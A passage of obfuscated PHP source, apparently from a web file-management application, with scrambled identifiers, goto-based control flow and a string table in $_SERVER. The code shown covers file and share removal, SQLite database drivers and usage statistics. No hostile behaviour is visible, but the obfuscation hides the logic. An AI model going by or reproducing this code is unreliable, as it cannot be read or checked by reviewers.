$_SERVER[Ç³Íß¦Ó]; $D¼Ëš³¹— = array_to_keyvalue(parent::listData(), $B°É¬ŸêÂ[392]); if (!isset($D¼Ëš³¹—[$EïƒÒˆïáÇ])) { return !1; } $bì³œğ±‹ö = $D¼Ëš³¹—[$EïƒÒˆïáÇ]; $bì³œğ±‹ö[$B°É¬ŸêÂ[6]] = json_decode($bì³œğ±‹ö[$B°É¬ŸêÂ[6]], !0); return $bì³œğ±‹ö; } public function remove($a¼‡áÜî‚µ) { $this->removeShareItems($a¼‡áÜî‚µ); return parent::remove($a¼‡áÜî‚µ); } public function removeWithFile($Fˆ²Ì¿œêœ, $c”¸ï¥¾) { goto cÃì‹¸Š·Š; dŞİÑÄ–İÆ: $a±°……Í¿->task[$Dó­é‰ª¢´[724]] = (double) $FàÍ½“”Ë; $BÏè‹ùÌëØ = KodIO::defaultDriver(); $D‘¦¯‰›ê„ = $BÏè‹ùÌëØ[$Dó­é‰ª¢´[392]]; goto dèçŠŒÛ¢‹; eÄ¨³ñ’­: $FàÍ½“”Ë = Model($Dó­é‰ª¢´[448])->where($EçÒ´Ş÷ˆ”)->sum($Dó­é‰ª¢´[78]); $a´’‘š« = $c”¸ï¥¾ . $Dó­é‰ª¢´[1998] . $Fˆ²Ì¿œêœ; $a±°……Í¿ = new TaskFileTransfer($a´’‘š«, $Dó­é‰ª¢´[1993], $eÃÛÜÏÕ¿ª, LNG($Dó­é‰ª¢´[1999]) . "\50{$Fˆ²Ì¿œêœ}\x29"); goto dŞİÑÄ–İÆ; cÃì‹¸Š·Š: $Dó­é‰ª¢´ =& $_SERVER[Ç³Íß¦Ó]; $EçÒ´Ş÷ˆ” = array($Dó­é‰ª¢´[783] => $Fˆ²Ì¿œêœ); $eÃÛÜÏÕ¿ª = Model($Dó­é‰ª¢´[448])->where($EçÒ´Ş÷ˆ”)->count(); goto eÄ¨³ñ’­; D·…ã­áÙé: $AÕœ³ë¦ = Model($Dó­é‰ª¢´[192])->where($EçÒ´Ş÷ˆ”)->field($Dó­é‰ª¢´[2000])->select(); foreach ($AÕœ³ë¦ as $BàªÀ¢„) { goto cê­Œ¤é‘´; Cî¦¥Îß°: if (IO::exist($D‚Ù‘‘ù›˜)) { $a±°……Í¿->updateFileEnd($BàªÀ¢„[$Dó­é‰ª¢´[28]], $BàªÀ¢„[$Dó­é‰ª¢´[78]]); continue; } if (!IO::move($aË‚İäİ©Õ, get_path_father($D‚Ù‘‘ù›˜))) { $Dç¡äëíÈ = !1; break; } $EçÒ´Ş÷ˆ” = array($Dó­é‰ª¢´[445] => $BàªÀ¢„[$Dó­é‰ª¢´[445]]); goto C‘¥ŒçÙ­§; C‘¥ŒçÙ­§: $BÕÑ”„½ğ = array($Dó­é‰ª¢´[783] => $D‘¦¯‰›ê„, $Dó­é‰ª¢´[76] => $D‚Ù‘‘ù›˜); Model($Dó­é‰ª¢´[192])->where($EçÒ´Ş÷ˆ”)->save($BÕÑ”„½ğ); goto A‰‚°ÌÇŒ; cê­Œ¤é‘´: $aË‚İäİ©Õ = $BàªÀ¢„[$Dó­é‰ª¢´[76]]; $D‚Ù‘‘ù›˜ = $fÎÓšŸ «Ø . str_replace("\173\151\157\x3a{$Fˆ²Ì¿œêœ}\175\x2f", $Dó­é‰ª¢´[33], $aË‚İäİ©Õ); if (!IO::exist($aË‚İäİ©Õ)) { $A»®…¹ÍÎƒ[] = $BàªÀ¢„[$Dó­é‰ª¢´[445]]; $a±°……Í¿->updateFileEnd($BàªÀ¢„[$Dó­é‰ª¢´[28]], $BàªÀ¢„[$Dó­é‰ª¢´[78]]); continue; } goto Cî¦¥Îß°; A‰‚°ÌÇŒ: } $this->removeByFileID($A»®…¹ÍÎƒ); goto eô˜„´…Ç‚; dèçŠŒÛ¢‹: $fÎÓšŸ «Ø = "\173\x69\157\72{$D‘¦¯‰›ê„}\175\x2f"; $Dç¡äëíÈ = !0; $A»®…¹ÍÎƒ = array(); goto D·…ã­áÙé; eô˜„´…Ç‚: if (!$Dç¡äëíÈ) { $a±°……Í¿->stop($a´’‘š«); return !1; } $a±°……Í¿->end(); if ($c”¸ï¥¾ == $Dó­é‰ª¢´[1655]) { $this->remove($Fˆ²Ì¿œêœ); } goto a”í™™ø«©; a”í™™ø«©: } public function progress($BêºëÔ«ã, $aæ…­Üİ†) { return Task::get($aæ…­Üİ† . $_SERVER[Ç³Íß¦Ó][1998] . $BêºëÔ«ã); } private function removeByFileID($bŒãÀÓ–• = array()) { goto B‘Ÿ¥Ì¶„â; B‘Ÿ¥Ì¶„â: $dº ±âÓ =& $_SERVER[Ç³Íß¦Ó]; if (empty($bŒãÀÓ–•)) { return; } $c Ø‰Îˆè³ = array($dº ±âÓ[445] => array($dº ±âÓ[7], $bŒãÀÓ–•)); goto d—‘Ò³Ô•İ; d—‘Ò³Ô•İ: $e±ñ¬›ÓÔ½ = Model($dº ±âÓ[1204])->where($c Ø‰Îˆè³)->field($dº ±âÓ[394])->select(); if (!$e±ñ¬›ÓÔ½) { return; } $e±ñ¬›ÓÔ½ = array_to_keyvalue($e±ñ¬›ÓÔ½, $dº ±âÓ[33], $dº ±âÓ[394]); goto e­î³„å’Æ; e­î³„å’Æ: foreach ($e±ñ¬›ÓÔ½ as $EñÜë£‚å‰) { Model($dº ±âÓ[407])->removeNow($EñÜë£‚å‰, !1); } goto AÕ¿ÊŒ³¸; AÕ¿ÊŒ³¸: } private function removeShareItems($EàİµçœÜ¨) { goto D´¥ï×‹Şò; C¿ÕõˆìçÆ: Model($c‡˜ ×ë[562])->remove($f»ÆŒ„ˆ‰); goto BÊ’‚„Óø; Aö­¨†î˜¹: $e‚Ä©Ã¬Øô = Model($c‡˜ ×ë[1666])->where($b¤š”§Ï„Ï)->field($c‡˜ ×ë[466])->select(); if (empty($e‚Ä©Ã¬Øô)) { return; } $f»ÆŒ„ˆ‰ = array_to_keyvalue($e‚Ä©Ã¬Øô, $c‡˜ ×ë[33], $c‡˜ ×ë[466]); goto C¿ÕõˆìçÆ; D´¥ï×‹Şò: $c‡˜ ×ë =& $_SERVER[Ç³Íß¦Ó]; $fº™Œ†é = "\173\151\157\72{$EàİµçœÜ¨}\x7d\x2f"; $b¤š”§Ï„Ï = array($c‡˜ ×ë[394] => 0, $c‡˜ ×ë[1071] => array($c‡˜ ×ë[379], "{$fº™Œ†é}\x25")); goto Aö­¨†î˜¹; BÊ’‚„Óø: } } goto Bé²Ú‡ÜŸˆ; E÷îš­øä¹: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto d×è¨Š›ÑÒ; d×è¨Š›ÑÒ: $Cæö’‹ªÆ± =& $_SERVER[Ç³Íß¦Ó]; global $in, $config; $this->config =& $config; goto bŸôÏåô·Ã; f’ôŞ¦››¾: $this->tpl = TEMPLATE . MOD . $Cæö’‹ªÆ±[8]; $this->_classObjectID = mt_rand(0, 10000); goto b”ëÊŞÉÕ¤; bŸôÏåô·Ã: $this->in =& $in; $this->values[$Cæö’‹ªÆ±[6]] =& $config; $this->values[$Cæö’‹ªÆ±[7]] =& $in; goto f’ôŞ¦››¾; b”ëÊŞÉÕ¤: } public function loadClass($FĞàµÅÁ‹ë) { if (1 === func_num_args()) { $this->{$FĞàµÅÁ‹ë} = new $FĞàµÅÁ‹ë(); } else { $BÀÄ¢éŞì = new ReflectionClass($FĞàµÅÁ‹ë); $aœšõÇ‡ŞŠ = func_get_args(); array_shift($aœšõÇ‡ŞŠ); $this->{$FĞàµÅÁ‹ë} = $BÀÄ¢éŞì->newInstanceArgs($aœšõÇ‡ŞŠ); } return $this->{$FĞàµÅÁ‹ë}; } protected function assign($bù”ò ¡¦, $CŞÌŒ™áåÖ) { $this->values[$bù”ò ¡¦] = $CŞÌŒ™áåÖ; } protected function display($bŸ„Â™ï¯Ü) { ob_end_clean(); extract($this->values); require $this->tpl . $bŸ„Â™ï¯Ü; } } class DbSqliteBase extends Db { public function __construct($c½éƒÍÕ§– = '') { $c÷´Şê–Èã =& $_SERVER[Ç³Íß¦Ó]; if (!extension_loaded($c÷´Şê–Èã[9])) { think_exception(think_lang($c÷´Şê–Èã[10]) . $c÷´Şê–Èã[11]); } if (!empty($c½éƒÍÕ§–)) { if (!isset($c½éƒÍÕ§–[$c÷´Şê–Èã[12]])) { $c½éƒÍÕ§–[$c÷´Şê–Èã[12]] = 438; } $this->config = $c½éƒÍÕ§–; if (empty($this->config[$c÷´Şê–Èã[13]])) { $this->config[$c÷´Şê–Èã[13]] = array(); } } } public function connect($d•ÉÍÓ¹ò² = '', $CÇÌ–µÖŞ = 0) { $C÷«·øªĞ =& $_SERVER[Ç³Íß¦Ó]; if (!isset($this->linkID[$CÇÌ–µÖŞ])) { goto fãŸ‘Í§ˆõ; EœŞÆƒ¯‰²: @sqlite_busy_timeout($this->linkID[$CÇÌ–µÖŞ], 30000); if (1 != think_config($C÷«·øªĞ[18])) { unset($this->config); } goto BÆÁå§ˆô‡; D—°æ¦çª: $this->linkID[$CÇÌ–µÖŞ] = $e¨ôåö¤Ò¿($d•ÉÍÓ¹ò²[$C÷«·øªĞ[17]], $d•ÉÍÓ¹ò²[$C÷«·øªĞ[12]]); if (!$this->linkID[$CÇÌ–µÖŞ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto EœŞÆƒ¯‰²; fãŸ‘Í§ˆõ: if (empty($d•ÉÍÓ¹ò²)) { $d•ÉÍÓ¹ò² = $this->config; } $EÃãšøËÍ‘ = !empty($d•ÉÍÓ¹ò²[$C÷«·øªĞ[13]][$C÷«·øªĞ[14]]) ? $d•ÉÍÓ¹ò²[$C÷«·øªĞ[13]][$C÷«·øªĞ[14]] : $this->pconnect; $e¨ôåö¤Ò¿ = $EÃãšøËÍ‘ ? $C÷«·øªĞ[15] : $C÷«·øªĞ[16]; goto D—°æ¦çª; BÆÁå§ˆô‡: } return $this->linkID[$CÇÌ–µÖŞ]; } public function free() { $this->queryID = null; } public function query($a†­˜Ê†ï) { goto D®ÌÇ Ò¥•; FÃ´ˆºŞÍœ: $this->queryStr = $a†­˜Ê†ï; if ($this->queryID) { $this->free(); } think_action_status($D²ˆœĞâ[19], 1); goto dÜ½ÎÜîÁ‘; Bàù¸É…å‰: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $dÉ“Àò®Á = $this->getAll(); return $dÉ“Àò®Á; } goto CÌğ³´Òº¡; dÜ½ÎÜîÁ‘: think_status($D²ˆœĞâ[20]); $this->queryID = sqlite_query($this->_linkID, $a†­˜Ê†ï); $this->debug(); goto Bàù¸É…å‰; D®ÌÇ Ò¥•: $D²ˆœĞâ =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FÃ´ˆºŞÍœ; CÌğ³´Òº¡: } public function execute($a¥±˜ë»íô) { goto A¶Œ òÕµÜ; A¶Œ òÕµÜ: $aãçƒ«¶©® =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d¸Ë’°œí¦; cÊ‘“ï™ÌÃ: think_status($aãçƒ«¶©®[20]); $fòôÁµ…£Ş = sqlite_exec($this->_linkID, $a¥±˜ë»íô); $this->debug(); goto cÏ¤Ô¶ŸÇ¸; d¸Ë’°œí¦: $this->queryStr = $a¥±˜ë»íô; if ($this->queryID) { $this->free(); } think_action_status($aãçƒ«¶©®[21], 1); goto cÊ‘“ï™ÌÃ; cÏ¤Ô¶ŸÇ¸: if (!1 === $fòôÁµ…£Ş) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto FÙ¶ùèø ; FÙ¶ùèø : } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ç³Íß¦Ó][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eªãƒÏƒäí = sqlite_query($this->_linkID, $_SERVER[Ç³Íß¦Ó][23]); if (!$eªãƒÏƒäí) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $A ‚…÷ùº‹ = sqlite_query($this->_linkID, $_SERVER[Ç³Íß¦Ó][24]); if (!$A ‚…÷ùº‹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $bì–ãÔô¹ï = array(); if ($this->numRows > 0) { for ($A¨¦àƒÜ…Ç = 0; $A¨¦àƒÜ…Ç < $this->numRows; $A¨¦àƒÜ…Ç++) { $bì–ãÔô¹ï[$A¨¦àƒÜ…Ç] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $bì–ãÔô¹ï; } public function getFields($b„²²‚«‹µ) { $bÑÚºËºÕÄ =& $_SERVER[Ç³Íß¦Ó]; $d¸ÍÔ¤‹›Ö = $this->query($bÑÚºËºÕÄ[25] . $b„²²‚«‹µ . $bÑÚºËºÕÄ[26]); $A”ÏÓîÕ‚‡ = array(); if ($d¸ÍÔ¤‹›Ö) { foreach ($d¸ÍÔ¤‹›Ö as $D™«ÍØ¯ùß => $aìî­«‰) { $A”ÏÓîÕ‚‡[$aìî­«‰[$bÑÚºËºÕÄ[27]]] = array($bÑÚºËºÕÄ[28] => $aìî­«‰[$bÑÚºËºÕÄ[27]], $bÑÚºËºÕÄ[29] => $aìî­«‰[$bÑÚºËºÕÄ[30]], $bÑÚºËºÕÄ[31] => (bool) ($aìî­«‰[$bÑÚºËºÕÄ[32]] === $bÑÚºËºÕÄ[33]), $bÑÚºËºÕÄ[34] => $aìî­«‰[$bÑÚºËºÕÄ[35]], $bÑÚºËºÕÄ[36] => strtolower($aìî­«‰[$bÑÚºËºÕÄ[37]]) == $bÑÚºËºÕÄ[38], $bÑÚºËºÕÄ[39] => strtolower($aìî­«‰[$bÑÚºËºÕÄ[40]]) == $bÑÚºËºÕÄ[41]); } } return $A”ÏÓîÕ‚‡; } public function getTables($C©ëÜ°ØÇÁ = '') { $EÖ°¹À°Ì© =& $_SERVER[Ç³Íß¦Ó]; $E°ÃÑÇŒÒà = $this->query($EÖ°¹À°Ì©[42] . $EÖ°¹À°Ì©[43] . $EÖ°¹À°Ì©[44]); $EòÆ×°Ğ‚ = array(); foreach ($E°ÃÑÇŒÒà as $dÇˆ¶¦ô© => $Cî¥ÜŠØ¥) { $EòÆ×°Ğ‚[$dÇˆ¶¦ô©] = current($Cî¥ÜŠØ¥); } return $EòÆ×°Ğ‚; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $c¶ƒˆñĞ´ë =& $_SERVER[Ç³Íß¦Ó]; $e–Ûò = sqlite_last_error($this->_linkID); $this->error = $e–Ûò . $c¶ƒˆñĞ´ë[4] . sqlite_error_string($e–Ûò); if ($c¶ƒˆñĞ´ë[33] != $this->queryStr) { $this->error .= LNG($c¶ƒˆñĞ´ë[45]) . $this->queryStr; } think_trace($this->error, $c¶ƒˆñĞ´ë[33], $c¶ƒˆñĞ´ë[46]); return $this->error; } public function escapeString($A¶¬ÔâŒµ) { return sqlite_escape_string($A¶¬ÔâŒµ); } public function parseLimit($fÊ¯¨±îÙ) { $e•ÚğùÆ”ë =& $_SERVER[Ç³Íß¦Ó]; $B™«‹äĞ°Š = $e•ÚğùÆ”ë[33]; if (!empty($fÊ¯¨±îÙ)) { $fÊ¯¨±îÙ = explode($e•ÚğùÆ”ë[47], $fÊ¯¨±îÙ); if (count($fÊ¯¨±îÙ) > 1) { $B™«‹äĞ°Š .= $e•ÚğùÆ”ë[48] . $fÊ¯¨±îÙ[1] . $e•ÚğùÆ”ë[49] . $fÊ¯¨±îÙ[0] . $e•ÚğùÆ”ë[50]; } else { $B™«‹äĞ°Š .= $e•ÚğùÆ”ë[48] . $fÊ¯¨±îÙ[0] . $e•ÚğùÆ”ë[50]; } } return $B™«‹äĞ°Š; } } class DbSqlite3Base extends Db { public function __construct($dØñŒ¨ÎÅÄ = '') { $aã ášğ½½ =& $_SERVER[Ç³Íß¦Ó]; if (!class_exists($aã ášğ½½[51])) { think_exception(think_lang($aã ášğ½½[10]) . $aã ášğ½½[52]); } if (!empty($dØñŒ¨ÎÅÄ)) { if (!isset($dØñŒ¨ÎÅÄ[$aã ášğ½½[12]])) { $dØñŒ¨ÎÅÄ[$aã ášğ½½[12]] = 438; } $this->config = $dØñŒ¨ÎÅÄ; if (empty($this->config[$aã ášğ½½[13]])) { $this->config[$aã ášğ½½[13]] = array(); } } } public function connect($aÄ–íŞ·Ø— = '', $b±‘ƒ²’êİ = 0) { $EîÏˆ­Íì§ =& $_SERVER[Ç³Íß¦Ó]; if (!isset($this->linkID[$b±‘ƒ²’êİ])) { if (empty($aÄ–íŞ·Ø—)) { $aÄ–íŞ·Ø— = $this->config; } $this->linkID[$b±‘ƒ²’êİ] = new SQLite3($aÄ–íŞ·Ø—[$EîÏˆ­Íì§[17]]); if (!$this->linkID[$b±‘ƒ²’êİ]) { think_exception($this->linkID[$b±‘ƒ²’êİ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$b±‘ƒ²’êİ]->busyTimeout(30000); if (1 != think_config($EîÏˆ­Íì§[18])) { unset($this->config); } } return $this->linkID[$b±‘ƒ²’êİ]; } public function free() { $this->queryID = null; } public function query($e³¶œ¾º‘ã) { goto aÌ“†ÉÅ‰; bïÅÒí˜: $this->queryStr = $e³¶œ¾º‘ã; if ($this->queryID) { $this->free(); } think_action_status($cö„ª–‰[19], 1); goto F‡Õ¯‚İ˜Š; Eï×ÎšÀù•: if (!1 === $this->queryID) { $this->error(); return !1; } else { $fù„¯šÊß‰ = $this->getAll(); $this->numRows = count($fù„¯šÊß‰); return $fù„¯šÊß‰; } goto CÄôë”À¿; F‡Õ¯‚İ˜Š: think_status($cö„ª–‰[20]); $this->queryID = $this->_linkID->query($e³¶œ¾º‘ã); $this->debug(); goto Eï×ÎšÀù•; aÌ“†ÉÅ‰: $cö„ª–‰ =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bïÅÒí˜; CÄôë”À¿: } public function execute($EØÀÄ°µÎ) { goto D²…ƒ“ßØ¨; eÖÂŠĞÀç¦: think_status($a¶†…©Ñ“š[20]); $bº¿°íİéˆ = $this->_linkID->exec($EØÀÄ°µÎ); $this->debug(); goto CÔåÑÏÅÀ; CÔåÑÏÅÀ: if (!1 === $bº¿°íİéˆ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto fÀ±”ÊëÛÌ; cÛùÌ˜®: $this->queryStr = $EØÀÄ°µÎ; if ($this->queryID) { $this->free(); } think_action_status($a¶†…©Ñ“š[21], 1); goto eÖÂŠĞÀç¦; D²…ƒ“ßØ¨: $a¶†…©Ñ“š =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cÛùÌ˜®; fÀ±”ÊëÛÌ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ç³Íß¦Ó][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bæ‹’Ò©‰” = $this->_linkID->query($_SERVER[Ç³Íß¦Ó][23]); if (!$bæ‹’Ò©‰”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $f¸ÕòŸŠ‰µ = $this->_linkID->query($_SERVER[Ç³Íß¦Ó][24]); if (!$f¸ÕòŸŠ‰µ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $F™‰©ï§İ = array(); while ($C«¤µ‡·‹ï = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $F™‰©ï§İ[] = $C«¤µ‡·‹ï; } $this->queryID->reset(); return $F™‰©ï§İ; } public function getFields($eÒƒ”ÅÌğô) { $aø™À“‹ Œ =& $_SERVER[Ç³Íß¦Ó]; $dëÍ‰©ÕŸì = $this->query($aø™À“‹ Œ[25] . $eÒƒ”ÅÌğô . $aø™À“‹ Œ[26]); $fÆ÷†øŠ¯ = array(); if ($dëÍ‰©ÕŸì) { foreach ($dëÍ‰©ÕŸì as $b…ÑÜÅª‡÷ => $D±ÁÜ›™˜) { $fÆ÷†øŠ¯[$D±ÁÜ›™˜[$aø™À“‹ Œ[28]]] = array($aø™À“‹ Œ[28] => $D±ÁÜ›™˜[$aø™À“‹ Œ[28]], $aø™À“‹ Œ[29] => $D±ÁÜ›™˜[$aø™À“‹ Œ[29]], $aø™À“‹ Œ[31] => (bool) ($D±ÁÜ›™˜[$aø™À“‹ Œ[31]] === $aø™À“‹ Œ[33]), $aø™À“‹ Œ[34] => $D±ÁÜ›™˜[$aø™À“‹ Œ[53]], $aø™À“‹ Œ[36] => (bool) $D±ÁÜ›™˜[$aø™À“‹ Œ[54]], $aø™À“‹ Œ[39] => (bool) $D±ÁÜ›™˜[$aø™À“‹ Œ[54]]); } } return $fÆ÷†øŠ¯; } public function getTables($dÆïöÆ—ã— = '') { $e—À±¼ÏùÌ =& $_SERVER[Ç³Íß¦Ó]; $CáÇŠËœŒŒ = $this->query($e—À±¼ÏùÌ[42] . $e—À±¼ÏùÌ[43] . $e—À±¼ÏùÌ[44]); $D¬ŒÚˆ‚šÔ = array(); foreach ($CáÇŠËœŒŒ as $dÉ¹ŒÅ¬ÍÌ => $f©×˜•…¬ˆ) { $D¬ŒÚˆ‚šÔ[$dÉ¹ŒÅ¬ÍÌ] = current($f©×˜•…¬ˆ); } return $D¬ŒÚˆ‚šÔ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $aßÊ…Ş«Ãç =& $_SERVER[Ç³Íß¦Ó]; $this->error = $this->_linkID->lastErrorMsg(); if ($aßÊ…Ş«Ãç[33] != $this->queryStr) { $this->error .= LNG($aßÊ…Ş«Ãç[45]) . $this->queryStr; } think_trace($this->error, $aßÊ…Ş«Ãç[33], $aßÊ…Ş«Ãç[46]); return $this->error; } public function escapeString($Fø²ã‹ç±ä) { $a—ßø±Ş =& $_SERVER[Ç³Íß¦Ó]; if ($this->_linkID) { return $this->_linkID->escapeString($Fø²ã‹ç±ä); } return str_ireplace($a—ßø±Ş[55], $a—ßø±Ş[56], $Fø²ã‹ç±ä); } public function parseLimit($C…¦ï¦öæ) { $dÎ…çê¦¹Ô =& $_SERVER[Ç³Íß¦Ó]; $f¥İ›ê™î = $dÎ…çê¦¹Ô[33]; if (!empty($C…¦ï¦öæ)) { $C…¦ï¦öæ = explode($dÎ…çê¦¹Ô[47], $C…¦ï¦öæ); if (count($C…¦ï¦öæ) > 1) { $f¥İ›ê™î .= $dÎ…çê¦¹Ô[48] . $C…¦ï¦öæ[1] . $dÎ…çê¦¹Ô[49] . $C…¦ï¦öæ[0] . $dÎ…çê¦¹Ô[50]; } else { $f¥İ›ê™î .= $dÎ…çê¦¹Ô[48] . $C…¦ï¦öæ[0] . $dÎ…çê¦¹Ô[50]; } } return $f¥İ›ê™î; } } goto FÙ´Á‰Ò¦; a¼¡¥„¸æ¡: class AnalysisModel extends ModelBaseLight { public function init($EªŠ¯Ò§Í…) { $dŞáèƒê† =& $_SERVER[Ç³Íß¦Ó]; $eõç‚ó² = array($dŞáèƒê†[561] => array($dŞáèƒê†[29] => $dŞáèƒê†[1615], $dŞáèƒê†[270] => array($dŞáèƒê†[221], $dŞáèƒê†[726], $dŞáèƒê†[1616], $dŞáèƒê†[1617])), $dŞáèƒê†[1618] => array($dŞáèƒê†[29] => $dŞáèƒê†[1619], $dŞáèƒê†[270] => array($dŞáèƒê†[221], $dŞáèƒê†[724], $dŞáèƒê†[1620], $dŞáèƒê†[1621], $dŞáèƒê†[1622]))); if (!isset($eõç‚ó²[$EªŠ¯Ò§Í…])) { return !1; } $this->optionType = $eõç‚ó²[$EªŠ¯Ò§Í…][$dŞáèƒê†[29]]; $this->field = $eõç‚ó²[$EªŠ¯Ò§Í…][$dŞáèƒê†[270]]; return !0; } public function listData($c×¹‡ ¸¬É = false, $b…×ï‘ÜÁã = "\x6d\x6f\x64\x69\146\171\124\x69\x6d\x65", $fÆ†Õ¸œÇÏ = false) { return parent::listData($c×¹‡ ¸¬É, $b…×ï‘ÜÁã, $fÆ†Õ¸œÇÏ); } public function trendList($fºó´™ä©¢) { goto E±„¡î; BÍ”î“ˆ˜ğ: foreach ($CçÈ©Œƒ¯ as $aš‡·£†’Ë) { $this->{$e‡ƒ©Ãßñª}($aš‡·£†’Ë); } return $this->listData(); goto B“í‹®„Ñ; E±„¡î: $D¯ºË²›èİ =& $_SERVER[Ç³Íß¦Ó]; $a£¼èêåÍñ = $this->listData(); if ($a£¼èêåÍñ) { $a”ÏäÄäÂ¶ = end($a£¼èêåÍñ); $aš‡·£†’Ë = date($D¯ºË²›èİ[1623], strtotime($D¯ºË²›èİ[1624])); if ($a”ÏäÄäÂ¶[$D¯ºË²›èİ[221]] == $aš‡·£†’Ë) { return $a£¼èêåÍñ; } $cÄ‹„…¹¯ = strtotime($a”ÏäÄäÂ¶[$D¯ºË²›èİ[221]]); } goto A£¶ì¥ê´; A£¶ì¥ê´: if (!isset($cÄ‹„…¹¯)) { $aã…Íá¦Øí = $fºó´™ä©¢ == $D¯ºË²›èİ[561] ? $D¯ºË²›èİ[505] : $D¯ºË²›èİ[791]; $cÄ‹„…¹¯ = Model($aã…Íá¦Øí)->min($D¯ºË²›èİ[193]); } $e‡ƒ©Ãßñª = $D¯ºË²›èİ[1625] . ucfirst($fºó´™ä©¢); $CçÈ©Œƒ¯ = $this->dateList($cÄ‹„…¹¯); goto BÍ”î“ˆ˜ğ; B“í‹®„Ñ: } private function dateList($câ³ÚÉà) { $aŞ¯Ïñ°Í¬ =& $_SERVER[Ç³Íß¦Ó]; $c–‘«©«ĞŠ = $câ³ÚÉà; $DŒ°Ó²ÛµÄ = strtotime($aŞ¯Ïñ°Í¬[1624]); $C‚ƒçëÁé = array(); while ($c–‘«©«ĞŠ <= $DŒ°Ó²ÛµÄ) { $C‚ƒçëÁé[] = date($aŞ¯Ïñ°Í¬[1623], $c–‘«©«ĞŠ); $c–‘«©«ĞŠ = strtotime($aŞ¯Ïñ°Í¬[1626], $c–‘«©«ĞŠ); } return $C‚ƒçëÁé; } public function _recordUser($BÂ¼ğ„×¨ = '') { goto AïŸœß—î; A‡ºô‘Œ¢: $fÂŒ²ï í = array($A»±ğ£ã¸[193] => array($A»±ğ£ã¸[970], $c†‹Å¿–Û)); $BëÇÈÈÅ¿‹ = Model($A»±ğ£ã¸[505])->where($fÂŒ²ï í)->count($A»±ğ£ã¸[1526]); $fÂŒ²ï í[$A»±ğ£ã¸[193]] = array($A»±ğ£ã¸[330], array($C•åÕÕÓ¶­, $c†‹Å¿–Û)); goto Côğî·Å‘â; AïŸœß—î: $A»±ğ£ã¸ =& $_SERVER[Ç³Íß¦Ó]; $C•åÕÕÓ¶­ = strtotime(date($A»±ğ£ã¸[1627], strtotime($BÂ¼ğ„×¨))); $c†‹Å¿–Û = strtotime(date($A»±ğ£ã¸[1628], strtotime($BÂ¼ğ„×¨))); goto A‡ºô‘Œ¢; Côğî·Å‘â: $A¿Î¼ã†Üº = Model($A»±ğ£ã¸[505])->where($fÂŒ²ï í)->count($A»±ğ£ã¸[1526]); $fÂŒ²ï í[$A»±ğ£ã¸[29]] = $A»±ğ£ã¸[1629]; $dœâÉ¿Â÷ = Model($A»±ğ£ã¸[1630])->where($fÂŒ²ï í)->count($A»±ğ£ã¸[1631]); goto eïê¿­Íß; eïê¿­Íß: $A‚Î«´ƒİÛ = array($A»±ğ£ã¸[221] => $BÂ¼ğ„×¨, $A»±ğ£ã¸[726] => (int) $BëÇÈÈÅ¿‹, $A»±ğ£ã¸[1616] => (int) $A¿Î¼ã†Üº, $A»±ğ£ã¸[1617] => (int) $dœâÉ¿Â÷); return $this->insert($A‚Î«´ƒİÛ); goto CŞ‚°Ããæ×; CŞ‚°Ããæ×: } public function _recordStore($EÈ¤è‘„Ÿ£ = '') { goto aùŞÉôòù; aùŞÉôòù: $d‚ëÚƒóƒÁ =& $_SERVER[Ç³Íß¦Ó]; $EÑ‰¼ÕÕÛ = strtotime(date($d‚ëÚƒóƒÁ[1628], strtotime($EÈ¤è‘„Ÿ£))); $fò‹¢ŠØŞ = array($d‚ëÚƒóƒÁ[193] => array($d‚ëÚƒóƒÁ[970], $EÑ‰¼ÕÕÛ)); goto FØÜÛŞ¾Ş; a‘è÷Œ£å²: $fò‹¢ŠØŞ[$d‚ëÚƒóƒÁ[402]] = 1; $cÌ®öğË÷Ë = Model($d‚ëÚƒóƒÁ[791])->where($fò‹¢ŠØŞ)->sum($d‚ëÚƒóƒÁ[78]); $fò‹¢ŠØŞ[$d‚ëÚƒóƒÁ[402]] = 2; goto EœÌŸèŒõæ; FØÜÛŞ¾Ş: $dÙòèÙö = Model($d‚ëÚƒóƒÁ[448])->where($fò‹¢ŠØŞ)->sum($d‚ëÚƒóƒÁ[78]); $fò‹¢ŠØŞ[$d‚ëÚƒóƒÁ[401]] = 0; $fŞõ´ÙæÙ = Model($d‚ëÚƒóƒÁ[791])->where($fò‹¢ŠØŞ)->sum($d‚ëÚƒóƒÁ[78]); goto a‘è÷Œ£å²; EœÌŸèŒõæ: $e÷ƒˆïëŠİ = Model($d‚ëÚƒóƒÁ[791])->where($fò‹¢ŠØŞ)->sum($d‚ëÚƒóƒÁ[78]); $AÙ¿«Êèáó = array($d‚ëÚƒóƒÁ[221] => $EÈ¤è‘„Ÿ£, 